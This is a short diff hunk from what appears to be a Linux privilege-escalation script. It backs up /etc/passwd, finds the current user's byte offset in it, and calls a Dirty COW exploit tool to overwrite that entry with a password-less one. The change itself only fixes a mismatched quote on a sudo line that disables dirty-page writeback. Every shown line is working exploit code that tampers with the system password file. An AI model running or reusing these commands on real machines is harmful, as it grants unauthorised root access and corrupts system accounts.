@@ -18,4 +18,4 @@
 backup /etc/passwd "$HOME/passwd"
 offset="$(grep --byte-offset "^$USER" /etc/passwd | cut --delimiter=':' --fields=1)"
 dirtycow -s "$USER:*" -o "$offset" /etc/passwd
-sudo bash -c 'echo 0 >/proc/sys/vm/dirty_writeback_centisecs"
+sudo bash -c 'echo 0 >/proc/sys/vm/dirty_writeback_centisecs'
